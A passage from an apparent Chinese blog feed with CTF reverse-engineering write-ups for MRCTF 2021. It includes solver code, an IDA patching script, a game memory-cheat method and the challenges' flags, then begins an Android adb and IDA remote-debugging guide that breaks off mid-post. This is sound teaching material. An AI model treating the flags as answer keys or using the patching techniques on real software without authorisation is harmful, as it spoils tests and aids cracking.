class="number">0</span>;j&lt;<span class="number">32</span>;++j)</span><br><span class="line">        &#123;</span><br><span class="line">            b -= ((a + sum) ^ (<span class="number">16</span> * a + ((<span class="keyword">unsigned</span> <span class="keyword">int</span>*)key)[<span class="number">1</span>]) ^ ((a &gt;&gt; <span class="number">5</span>) + ((<span class="keyword">unsigned</span> <span class="keyword">int</span>*)key)[<span class="number">0</span>]));</span><br><span class="line">            a -= (b + sum) ^ (<span class="number">16</span> * b + ((<span class="keyword">unsigned</span> <span class="keyword">int</span>*)key)[<span class="number">3</span>]) ^ ((b &gt;&gt; <span class="number">5</span>) + ((<span class="keyword">unsigned</span> <span class="keyword">int</span>*)key)[<span class="number">2</span>]);</span><br><span class="line">            sum -=det;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"%.4s%.4s"</span>,(<span class="keyword">char</span>*)&amp;a,(<span class="keyword">char</span>*)&amp;b);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>MRCTF{Dyn4m1c_d3buG_1s_a_ki11eR}</p></blockquote><h4 id="EzGame"><a href="#EzGame" class="headerlink" title="EzGame"></a>EzGame</h4><p>玩出来</p><p><img src="http://inews.gtimg.com/newsapp_ls/0/13399130860/0" alt=""></p><p>条件是只死一次 捡到105个星星 捡到曲奇 找到外星人 回家</p><p>如果不开挂的话是完不成的 因为捡曲奇就会死 然后105个星星有的星星太高了</p><p>所以至少需要一个能够更改高度的挂</p><p>然后跳起来为0 可以跳起来即平地状态搜1 可以搜到一个地址</p><p>然后一直锁写1就可以连跳了</p><p>然后正常完成任务只死一次就可以getflag了</p><p>不过后来研究了一下</p><p>在点击getflag的时候</p><p>会判断是否吃饼干 是否回家 是否找到外星人 星星是否是105 是否只死1次</p><p>然后用一个key去解密 再判断解密后的flag前5位是否是MRCTF 如果不是就说你作弊</p><p>有一个关键就是捡星星的时候key会被改变</p><p>于是逆出了算法</p><p>然后用转换过一次的key再转换104次即得到正确的key</p><p>再把其他条件hack一下 点击getflag就可以得到flag了</p><p>补一张连跳的图</p><p><img src="http://inews.gtimg.com/newsapp_ls/0/13417607992/0" alt=""></p><p><img src="http://inews.gtimg.com/newsapp_ls/0/13399130875/0" alt=""></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;defs.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">fun</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span>&amp; key)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">char</span> v13;</span><br><span class="line"><span class="keyword">int</span> v11;</span><br><span class="line"><span class="keyword">long</span> <span class="keyword">long</span> v10,v12;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> v14;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">4</span>;++i)</span><br><span class="line">&#123;</span><br><span class="line">v10 = <span class="number">0</span>;</span><br><span class="line">v11 = <span class="number">0</span>;</span><br><span class="line">v12 = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>;j&lt;<span class="number">64</span>;++j)</span><br><span class="line">&#123;</span><br><span class="line">v13 = v11++ &amp; <span class="number">0x3F</span>;</span><br><span class="line">v14 = v12 &amp; key;</span><br><span class="line">v12 = __ROL8__(v12, <span class="number">1</span>);</span><br><span class="line">v10 ^= v14 &gt;&gt; v13;</span><br><span class="line">&#125;</span><br><span class="line">key = v10 | (<span class="number">2</span> * key);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> key=<span class="number">0xEADBEEFAA114514E</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">104</span>;++i)</span><br><span class="line">fun(key);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%llx"</span>,key);</span><br><span class="line"></span><br><span class="line">&#125;<span class="comment">//ea8451453bd5b7dd</span></span><br></pre></td></tr></table></figure><blockquote><p>MRCTF{Ez_G@mE_MaY_Be_Ha3d_4_y0U}</p></blockquote><h4 id="MR-register"><a href="#MR-register" class="headerlink" title="MR_register"></a>MR_register</h4><p>这题很有意思</p><p>打开主main后,主main创建管道</p><p>然后用环境变量 hWrite 保存管道句柄</p><p>然后打开子main</p><p>然后主main一直等待debug事件</p><p>debug事件有下</p><p><img src="http://inews.gtimg.com/newsapp_ls/0/13399130916/0" alt=""></p><p>如果 rip 为 int 3, rip+1 为 0x25 则让 rip+=2 </p><p>0x25是作者故意写在子main流程的字节 用来标识</p><p><img src="http://inews.gtimg.com/newsapp_ls/0/13399130940/0" alt=""></p><p>如果 rip 为0x25,rip+1 也为0x25 就读一段字节 异或后 写回 rip</p><p>这里动调可以知道这里异或的是子main的下面</p><p>用ida脚本异或一下即可 再把他的那些没用的0x25 0xC3 nop掉即可反编译</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> idc</span><br><span class="line">st = <span class="number">0x401E1f</span></span><br><span class="line">i = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> st &lt;= <span class="number">0x401E1f</span>+<span class="number">0x57d</span>:</span><br><span class="line">    value = ida_bytes.get_byte(st)</span><br><span class="line">    value ^= (i%<span class="number">256</span>)</span><br><span class="line">    ida_bytes.patch_byte(st, value)</span><br><span class="line">    st += <span class="number">1</span></span><br><span class="line">    i += <span class="number">1</span></span><br></pre></td></tr></table></figure><p>还有一个除零异常</p><p><img src="http://inews.gtimg.com/newsapp_ls/0/13399130953/0" alt=""></p><p>里面有一个 call 扰乱了ida分析 nop 掉即可反编译</p><p><img src="http://inews.gtimg.com/newsapp_ls/0/13399130987/0" alt=""></p><p>这里又是和上面的 读 异或 写 流程很像</p><p>动调这里就可以得到异或后的字节 是后面会用到的 cmp</p><p>子main流程如下</p><p><img src="http://inews.gtimg.com/newsapp_ls/0/13399131020/0" alt=""></p><p>将 cmp 的内容写入管道 然后引发除零异常 异常处理完后 cmp 已经被修改过了</p><p>sub_401CA7 中引发了 int 3 修改了字节码 用上面那个脚本处理过后(并nop掉没用字节)可以比较清晰的反编译</p><p>这个函数将两个输入运算后将结果写到 WINDIR\temp\sign 中</p><p>而下面那个 sub_40239E 就是 check 函数</p><p>初步逆了一下正向算法如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="keyword">char</span> table[]=<span class="string">"ABCDEFGH123456780IJKLMNO+OPQRStu\\vwxyzTUabcdefghVWXYZijklmnopqrs"</span>;</span><br><span class="line"><span class="keyword">char</span> cmp[]=<span class="string">"GZ5yExGiGXEx5zGXExGWHlHlExGX5wGVExGZ5wGYExGk5vGjEx5xHl5yExGWGZ5vGWExGXGWHl5yExGYGj5vGkExGiHlGjGZExHl5THlGVEx5zHlGZGYExGWGkHlGXGkExGXGjGVHm5yExGY5yHmGXGjExGjGY5vGYHlEx5vGWGY5xGiExGWGVGZ5zGi5xExGW5vGjGXGiGXExGX5v5wGWGXGXExGZGiGWGY5wGYExGj5T5xGiGYGZEx5wGZ5yHmGiGiExGWGXGZHm5z5wHmExGW5yHmGkHlGj5yExGX5T5zGWGkHm5yExGZ5yGkHmGVGj5wExGk5yGi5vHlGZGWEx5x5v5yGYHl5x5yExGWGZHlGX5zGWHl5wEx"</span>;</span><br><span class="line"><span class="keyword">char</span> mail[<span class="number">1000</span>];<span class="comment">//input1</span></span><br><span class="line"><span class="keyword">char</span> crit[<span class="number">1000</span>];<span class="comment">//input2</span></span><br><span class="line"><span class="keyword">char</span> v8[]=&#123;<span class="number">0</span>,<span class="number">2</span>,<span class="number">4</span>,<span class="number">6</span>&#125;;</span><br><span class="line"><span class="keyword">char</span> v10[<span class="number">1000</span>];</span><br><span class="line"><span class="keyword">char</span> v11[<span class="number">1000</span>];</span><br><span class="line"><span class="keyword">char</span> Buf[<span class="number">1000</span>];</span><br><span class="line"><span class="keyword">char</span> Des[<span class="number">1000</span>];</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> v21[<span class="number">1000</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> cha1,cha2,cha3;</span><br><span class="line">    <span class="keyword">int</span> i,j,lv10,lv11,_pos;</span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; <span class="built_in">strlen</span>(mail); ++i )</span><br><span class="line">    &#123;</span><br><span class="line">        cha1 = (mail[i] &gt;&gt; <span class="number">6</span>) &amp; <span class="number">1</span> ^ v8[i % <span class="number">4</span>];</span><br><span class="line">        cha2 = (mail[i] &gt;&gt; <span class="number">3</span>) &amp; <span class="number">7</span>;</span><br><span class="line">        cha3 = mail[i] &amp; <span class="number">7</span>;</span><br><span class="line">        v10[j]     = table[<span class="number">9</span> * cha1 + cha2];</span><br><span class="line">        v10[j + <span class="number">1</span>] = table[<span class="number">9</span> * cha2 + cha3];</span><br><span class="line">        j += <span class="number">2</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    v21[<span class="number">0</span>] = *crit;</span><br><span class="line">    v21[<span class="number">1</span>] = crit[<span class="number">1</span>];</span><br><span class="line">    <span class="built_in">sprintf</span>(Buf, <span class="string">"%x#"</span>, (<span class="keyword">unsigned</span> <span class="keyword">int</span>)v21[<span class="number">0</span>]);</span><br><span class="line">    <span class="built_in">sprintf</span>(&amp;Buf[<span class="built_in">strlen</span>(Buf)], <span class="string">"%x#"</span>, (<span class="keyword">unsigned</span> <span class="keyword">int</span>)v21[<span class="number">1</span>]);</span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="number">2</span>; i &lt; <span class="built_in">strlen</span>(crit); ++i )</span><br><span class="line">    &#123;</span><br><span class="line">        v21[i] = v21[i - <span class="number">2</span>] + v21[i - <span class="number">1</span>] + crit[i];</span><br><span class="line">        <span class="built_in">sprintf</span>(&amp;Buf[<span class="built_in">strlen</span>(Buf)], <span class="string">"%x#"</span>, (<span class="keyword">unsigned</span> <span class="keyword">int</span>)v21[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    j = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; <span class="built_in">strlen</span>(Buf); ++i )</span><br><span class="line">    &#123; </span><br><span class="line">        cha1 = (Buf[i] &gt;&gt; <span class="number">6</span>) &amp; <span class="number">1</span>;</span><br><span class="line">        cha2 = (Buf[i] &gt;&gt; <span class="number">3</span>) &amp; <span class="number">7</span>;</span><br><span class="line">        cha3 = Buf[i] &amp; <span class="number">7</span>;</span><br><span class="line">        v11[j]     = table[<span class="number">9</span> * cha1 + cha2];</span><br><span class="line">        v11[j + <span class="number">1</span>] = table[<span class="number">9</span> * cha2 + cha3];</span><br><span class="line">        j += <span class="number">2</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    lv11 = <span class="built_in">strlen</span>(v11);</span><br><span class="line">    lv10 = <span class="built_in">strlen</span>(v10);</span><br><span class="line">    <span class="built_in">strcpy</span>(Des, v10);</span><br><span class="line">    Des[<span class="built_in">strlen</span>(Des)] = <span class="string">'-'</span>;</span><br><span class="line">    <span class="keyword">for</span> ( i = lv10 + <span class="number">1</span>; i &lt;= lv11 + lv10; ++i )</span><br><span class="line">        Des[i] = v11[i - lv10 - <span class="number">1</span>] ^ v10[(i - lv10 - <span class="number">1</span>) % lv10];</span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="number">0</span>; Des[i]; ++i )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>( Des[i] == <span class="string">'-'</span> )</span><br><span class="line">        &#123;</span><br><span class="line">            _pos = i;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    j = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> ( i = _pos + <span class="number">1</span>; i &lt; <span class="built_in">strlen</span>(Des) ; ++i )</span><br><span class="line">    &#123;</span><br><span class="line">        Des[i] ^= Des[j % _pos];</span><br><span class="line">        <span class="keyword">if</span> ( Des[i] != cmp[j] )</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        ++j;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>仔细看看可以发现mail被异或两次 相当于mail无所谓</p><p>尝试解发现table有问题 仔细看了一下才发现 每8位他加了一个空格</p><p>后面用的编辑器把#去掉 换成正确的格式 再解掉斐波那契算法即得flag</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> flag[<span class="number">100</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line"><span class="keyword">char</span> table[]=<span class="string">"ABCDEFGH 12345678 0IJKLMNO +OPQRStu \\vwxyzTU abcdefgh VWXYZijk lmnopqrs"</span>;</span><br><span class="line"><span class="keyword">char</span> cmp[]=<span class="string">"GZ5yExGiGXEx5zGXExGWHlHlExGX5wGVExGZ5wGYExGk5vGjEx5xHl5yExGWGZ5vGWExGXGWHl5yExGYGj5vGkExGiHlGjGZExHl5THlGVEx5zHlGZGYExGWGkHlGXGkExGXGjGVHm5yExGY5yHmGXGjExGjGY5vGYHlEx5vGWGY5xGiExGWGVGZ5zGi5xExGW5vGjGXGiGXExGX5v5wGWGXGXExGZGiGWGY5wGYExGj5T5xGiGYGZEx5wGZ5yHmGiGiExGWGXGZHm5z5wHmExGW5yHmGkHlGj5yExGX5T5zGWGkHm5yExGZ5yGkHmGVGj5wExGk5yGi5vHlGZGWEx5x5v5yGYHl5x5yExGWGZHlGX5zGWHl5wEx"</span>;</span><br><span class="line"><span class="keyword">int</span> a[<span class="number">650</span>];</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> buf[<span class="number">1000</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>;cmp[i];i++)</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>;j&lt;<span class="number">65</span>;j++)</span><br><span class="line">            <span class="keyword">if</span> (cmp[i] == table[j])</span><br><span class="line">            &#123;</span><br><span class="line">                a[i] = j;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">    <span class="keyword">int</span> k = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>;i&lt;<span class="number">377</span>;i+=<span class="number">2</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">unsigned</span> <span class="keyword">char</span> cha1 = (a[i] &gt; <span class="number">9</span>);</span><br><span class="line">        <span class="keyword">unsigned</span> <span class="keyword">char</span> cha2 = a[i  ] - <span class="number">9</span> * cha1;</span><br><span class="line">        <span class="keyword">unsigned</span> <span class="keyword">char</span> cha3 = a[i+<span class="number">1</span>] - <span class="number">9</span> * cha2;</span><br><span class="line">        buf[k++]=(cha1&lt;&lt;<span class="number">6</span>)|(cha2&lt;&lt;<span class="number">3</span>)|cha3;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//printf("%s",buf);</span></span><br><span class="line">    <span class="comment">//4d#52#e2#188#2b0#4b3#7a6#c8d#14a1#218d#36a7#5864#8f80#e843#17827#2609d#3d926#63a38#a13c5#104e5c#1a6252#2ab122#4513b3#6fc534#b4d955#1249eb9#1d9786d#2fe179d#4d7906b#7d5a841#cad38cd#1482e18b#</span></span><br><span class="line">    <span class="keyword">int</span> tmp[]=&#123;<span class="number">0x4d</span>,<span class="number">0x52</span>,<span class="number">0xe2</span>,<span class="number">0x188</span>,<span class="number">0x2b0</span>,<span class="number">0x4b3</span>,<span class="number">0x7a6</span>,<span class="number">0xc8d</span>,<span class="number">0x14a1</span>,<span class="number">0x218d</span>,<span class="number">0x36a7</span>,<span class="number">0x5864</span>,<span class="number">0x8f80</span>,<span class="number">0xe843</span>,<span class="number">0x17827</span>,<span class="number">0x2609d</span>,<span class="number">0x3d926</span>,<span class="number">0x63a38</span>,<span class="number">0xa13c5</span>,<span class="number">0x104e5c</span>,<span class="number">0x1a6252</span>,<span class="number">0x2ab122</span>,<span class="number">0x4513b3</span>,<span class="number">0x6fc534</span>,<span class="number">0xb4d955</span>,<span class="number">0x1249eb9</span>,<span class="number">0x1d9786d</span>,<span class="number">0x2fe179d</span>,<span class="number">0x4d7906b</span>,<span class="number">0x7d5a841</span>,<span class="number">0xcad38cd</span>,<span class="number">0x1482e18b</span>&#125;;</span><br><span class="line">    flag[<span class="number">0</span>]=<span class="number">0x4d</span>;flag[<span class="number">1</span>]=<span class="number">0x52</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">2</span>;tmp[i];++i)</span><br><span class="line">        flag[i]=tmp[i]-tmp[i<span class="number">-1</span>]-tmp[i<span class="number">-2</span>];</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%s"</span>,flag);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>MRCTF{C4n_y0u_d3bug_1t?_n0_wa9!}</p></blockquote><h4 id="MRCheckin"><a href="#MRCheckin" class="headerlink" title="MRCheckin"></a>MRCheckin</h4><p>首先第一个框框明文比较 MRCTF</p><p>然后切片(6,13]的md5解得为 Andr01d</p><p>然后格式 MRCTF{Andr01d+xxx}</p><p><img src="http://inews.gtimg.com/newsapp_ls/0/13399131051/0" alt=""></p><p>又由cmp的数组长度可知xxx长度为25</p><p><img src="http://inews.gtimg.com/newsapp_ls/0/13399131080/0" alt=""></p><p>然后动调出key数组即可</p><p><img src="http://inews.gtimg.com/newsapp_ls/0/13399131136/0" alt=""></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> cmp[]=&#123;<span class="number">110</span>, <span class="number">82</span>, <span class="number">89</span>, <span class="number">87</span>, <span class="number">86</span>, <span class="number">0x5F</span>, <span class="number">6</span>, <span class="number">94</span>, <span class="number">105</span>, <span class="number">71</span>, <span class="number">80</span>, <span class="number">92</span>, <span class="number">83</span>, <span class="number">4</span>, <span class="number">93</span>, <span class="number">85</span>, <span class="number">0x6F</span>, <span class="number">65</span>, <span class="number">93</span>, <span class="number">0x6F</span>, <span class="number">0x7C</span>, <span class="number">98</span>, <span class="number">0x73</span>, <span class="number">100</span>, <span class="number">0x76</span>&#125;;</span><br><span class="line">    <span class="keyword">char</span> key[<span class="number">100</span>]=&#123;<span class="number">0x31</span>,<span class="number">0x31</span>,<span class="number">0x31</span>,<span class="number">0x32</span>,<span class="number">0x35</span>,<span class="number">0x34</span>,<span class="number">0x37</span>,<span class="number">0x30</span>,<span class="number">0x36</span>,<span class="number">0x30</span>,<span class="number">0x35</span>,<span class="number">0x30</span>,<span class="number">0x30</span>,<span class="number">0x34</span>,<span class="number">0x30</span>,<span class="number">0x30</span>,<span class="number">0x30</span>,<span class="number">0x35</span>,<span class="number">0x32</span>,<span class="number">0x30</span>,<span class="number">0x31</span>,<span class="number">0x30</span>,<span class="number">0x30</span>,<span class="number">0x30</span>,<span class="number">0x30</span>,<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;key[i];++i)</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%c"</span>,key[i]^cmp[i]);</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>MRCTF{Andr01d_check1n_welc0me_to_MRCTF}</p></blockquote>]]></content:encoded>
      
      <comments>https://usher2008.github.io/2021/04/11/MRCTF%202021/#disqus_thread</comments>
    </item>
    
    <item>
      <title>安卓逆向踩坑记录</title>
      <link>https://usher2008.github.io/2021/03/21/%E5%AE%89%E5%8D%93%E9%80%86%E5%90%91%E8%B8%A9%E5%9D%91%E8%AE%B0%E5%BD%95/</link>
      <guid>https://usher2008.github.io/2021/03/21/%E5%AE%89%E5%8D%93%E9%80%86%E5%90%91%E8%B8%A9%E5%9D%91%E8%AE%B0%E5%BD%95/</guid>
      <pubDate>Sun, 21 Mar 2021 14:19:29 GMT</pubDate>
      <description>
      
        &lt;h1 id=&quot;安卓逆向踩坑记录&quot;&gt;&lt;a href=&quot;#安卓逆向踩坑记录&quot; class=&quot;headerlink&quot; title=&quot;安卓逆向踩坑记录&quot;&gt;&lt;/a&gt;安卓逆向踩坑记录&lt;/h1&gt;&lt;h2 id=&quot;前期准备&quot;&gt;&lt;a href=&quot;#前期准备&quot; class=&quot;headerlink&quot; title=&quot;前期准备&quot;&gt;&lt;/a&gt;前期准备&lt;/h2&gt;

要完整完成该文章的内容至少需要&lt;br&gt;

硬件:&lt;br&gt;

一台安卓机(root不root都行)  一条数据线  一个wifi以及网卡&lt;br&gt;

软件:&lt;br&gt;
ida、adb、jeb、vmos、v&amp;nctf公开赛crackme1.apk&lt;br&gt;
      
      </description>
      
      
      <content:encoded><![CDATA[<h1 id="安卓逆向踩坑记录"><a href="#安卓逆向踩坑记录" class="headerlink" title="安卓逆向踩坑记录"></a>安卓逆向踩坑记录</h1><h2 id="前期准备"><a href="#前期准备" class="headerlink" title="前期准备"></a>前期准备</h2>要完整完成该文章的内容至少需要<br>硬件:<br>一台安卓机(root不root都行)  一条数据线  一个wifi以及网卡<br>软件:<br>ida、adb、jeb、vmos、v&nctf公开赛crackme1.apk<br><a id="more"></a><h2 id="adb的两种连接方式"><a href="#adb的两种连接方式" class="headerlink" title="adb的两种连接方式"></a>adb的两种连接方式</h2><h3 id="usb连接"><a href="#usb连接" class="headerlink" title="usb连接"></a>usb连接</h3><p>(手机<strong>需要root</strong> 小米谷歌比较好root 其他…)</p><p>一般情况是这样的</p><p>usb连接电脑选择传输文件</p><p>打开手机的设置 选中关于手机 然后点很多下版本号</p><img src="http://inews.gtimg.com/newsapp_ls/0/13316590219/0" alt="" style="zoom:50%;" /><p>就会出现开发者模式(如果找不到可以在设置里搜索)</p><p>进去打开USB调试选项</p><img src="http://inews.gtimg.com/newsapp_ls/0/13316590382/0" style="zoom:50%;" /><p>然后cmd输入指令</p><p><img src="http://inews.gtimg.com/newsapp_ls/0/13316590446/0" alt=""></p><blockquote><p>adb kill-server 这句的意思是终止adb服务</p><p>adb devices     意思是查看现在所连接的设备 如果adb服务没开会帮你打开</p><p>adb shell          就是拿到设备的shell了</p></blockquote><h3 id="vmos无线adb"><a href="#vmos无线adb" class="headerlink" title="vmos无线adb"></a>vmos无线adb</h3><p>vmos最大的好处就是</p><p>即使主机<strong>没有root</strong> vmos虚拟机内<strong>也可以获得root权限</strong></p><p>电脑和手机连接同一wifi</p><p>然后打开虚拟机</p><p>在vmos的设置里找到网络adb并打开</p><img src="http://inews.gtimg.com/newsapp_ls/0/13316590518/0" alt="" style="zoom:50%;" /><p>然后输入如图指令</p><p><img src="http://inews.gtimg.com/newsapp_ls/0/13316590593/0" alt="image-20210318163133827"></p><blockquote><p>adb connect 192.168.123.193:5666   这句是连接这个ip</p></blockquote><p>如果没连接上重新打开一下网络ADB就行</p><h2 id="so层调试"><a href="#so层调试" class="headerlink" title="so层调试"></a>so层调试</h2><img src="http://inews.gtimg.com/newsapp_ls/0/13316590635/0" alt="" style="zoom:80%;" /><p>我这边提前把服务丢进去了</p><p>如果没丢进去 一般就像这种这样</p><img src="http://inews.gtimg.com/newsapp_ls/0/13316590690/0" alt="" style="zoom:80%;" /><p>打开之后还要转发一下tcp端口</p><p>这里我是这样理解的</p><p>前一个23946是主机这边所连接的端口</p><p>而后一个23946是虚拟机里ida服务所使用的默认的端口</p><p>而这里所实现的就是将192.168.123.193:23946转发到了127.0.0.1:23946端口</p><p>所以这一步也不是必须做的</p><p><img src="http://inews.gtimg.com/newsapp_ls/0/13316590788/0" alt=""></p><p>如果转发了端口,ida里就可以这样设置了</p><p><img src="http://inews.gtimg.com/newsapp_ls/0/13316590838/0" alt=""></p><p>而如果没有转发端口</p><p><img src="http://inews.gtimg.com/newsapp_ls/0/13316590907/0" alt=""></p><p>这样设置也是可以的</p><p>然后attach</p><p><img src="http://inews.gtimg.com/newsapp_ls/0/13316590972/0" alt=""></p><p>如果在modules里找不到.so而是.apk</p><p><img src="http://inews.gtimg.com/newsapp_ls/0/13316591021/0" alt="image-20210318155827056"></p><p>这样根本调试不了</p><p>经过排查以后,发现如果使用mt管理器安装apk,会将so文件解压到了本地</p><p>而直接用系统安装的时候这个装so的文件夹是空的,是临时从base.apk里解压出来的</p><img src="http://inews.gtimg.com/newsapp_ls/0/13316591095/0" alt="" style="zoom:50%;" /><p>所以解决办法就是将so移动到app运行的位置</p><p>或者直接用mt管理器安装就可以了</p><p><img 